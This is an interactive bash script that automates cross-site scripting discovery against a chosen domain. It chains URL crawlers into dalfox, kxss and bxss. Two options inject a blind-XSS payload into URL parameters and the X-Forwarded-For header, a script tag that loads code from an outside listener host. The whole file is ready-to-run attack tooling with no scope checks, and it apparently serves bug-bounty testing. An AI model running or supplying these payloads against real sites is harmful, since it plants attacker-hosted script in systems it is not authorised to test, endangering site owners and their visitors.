#!/bin/bash

# Function for Option 1: XSS using waybackurls, gf, and dalfox
option1() {
  read -p "Enter the domain (e.g., domain.com): " domain
  read -p "Enter the Blind XSS listener domain (e.g., YOURS.xss.ht): " blind_xss_listener
  waybackurls "$domain" | \
  gf xss | \
  sed 's/=.*=//' | \
  sort -u | \
  tee file.txt && \
  cat file.txt | dalfox pipe -b "$blind_xss_listener" > xss_Results_wayback.txt
  echo "XSS results saved in xss_Results_wayback.txt"
}

# Function for Option 2: XSS using gospider, qsreplace, and dalfox
option2() {
  read -p "Enter the file containing URLs (e.g., urls.txt): " urls_file
  read -p "Enter the Blind XSS listener domain (e.g., YOURS.xss.ht): " blind_xss_listener

  gospider -S "$urls_file" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | \
  grep -e "code-200" | \
  awk '{print $5}' | \
  grep "=" | \
  qsreplace "a" | \
  dalfox pipe -b "$blind_xss_listener" | \
  tee -a xss_out.txt
  echo "XSS results saved in xss_out.txt"
}

# Function for Option 3: XSS using gau, gf, uro, Gxss, and kxss
option3() {
  read -p "Enter the domain (e.g., domain.com): " domain
  echo "$domain" | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
  cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*=/=/' | sort -u > final.txt
  echo "Filtered XSS results saved in final.txt"
}

# Function for Option 4: Header-based Blind XSS using bxss tool
option4() {
  read -p "Enter the domain (e.g., domain.com): " domain
  read -p "Enter the Blind XSS listener domain (e.g., YOURS.xss.ht): " blind_xss_listener
  subfinder "$domain" | gau | bxss -payload '"><script src=https://$blind_xss_listener></script>' -header "X-Forwarded-For"
  echo "Header-based Blind XSS testing completed."
}

# Function for Option 5: Blind XSS in parameters using bxss
option5() {
  read -p "Enter the domain (e.g., domain.com): " domain
  read -p "Enter the Blind XSS listener domain (e.g., YOURS.xss.ht): " blind_xss_listener
  subfinder "$domain" | gau | grep "&" | bxss -appendMode -payload '"><script src=https://$blind_xss_listener></script>' -parameters
  echo "Blind XSS in parameters testing completed."
}

# Main script starts here
echo "Choose an option for XSS detection:"
echo "1) XSS using waybackurls, gf, and dalfox"
echo "------------------------------------------------------------"
echo "Command that will run for Option 1:"
echo -e "\033[1;34mwaybackurls <domain> | gf xss | sed 's/=.*=/' | sort -u | tee file.txt && cat file.txt | dalfox pipe -b <Blind_XSS_Listener> > xss_Results_wayback.txt\033[0m"
echo "------------------------------------------------------------"
echo "2) XSS using gospider, qsreplace, and dalfox"
echo "------------------------------------------------------------"
echo "Command that will run for Option 2:"
echo -e "\033[1;34mgospider -S <urls_file> -c 10 -d 5 --blacklist \".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)\" --other-source | grep -e \"code-200\" | awk '{print $5}' | grep \"=\" | qsreplace \"a\" | dalfox pipe -b <Blind_XSS_Listener> | tee -a xss_out.txt\033[0m"
echo "------------------------------------------------------------"
echo "3) XSS using gau, gf, uro, Gxss, and kxss"
echo "------------------------------------------------------------"
echo "Command that will run for Option 3:"
echo -e "\033[1;34mecho <domain> | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt && cat xss_output.txt | grep -oP '^URL: \\K\\S+' | sed 's/=.*=/=/' | sort -u > final.txt\033[0m"
echo "------------------------------------------------------------"
echo "4) Header-based Blind XSS using bxss tool"
echo "------------------------------------------------------------"
echo "Command that will run for Option 4:"
echo -e "\033[1;34msubfinder <domain> | gau | bxss -payload '\"><script src=https://<Blind_XSS_Listener></script>' -header \"X-Forwarded-For\"\033[0m"
echo "------------------------------------------------------------"
echo "5) Blind XSS in parameters using bxss"
echo "------------------------------------------------------------"
echo "Command that will run for Option 5:"
echo -e "\033[1;34msubfinder <domain> | gau | grep \"&\" | bxss -appendMode -payload '\"><script src=https://<Blind_XSS_Listener></script>' -parameters\033[0m"
echo "------------------------------------------------------------"
read -p "Enter your choice (1, 2, 3, 4, or 5): " choice

case $choice in
  1)
    option1
    ;;
  2)
    option2
    ;;
  3)
    option3
    ;;
  4)
    option4
    ;;
  5)
    option5
    ;;
  *)
    echo "Invalid choice. Please run the script again and select a valid option."
    ;;
esac
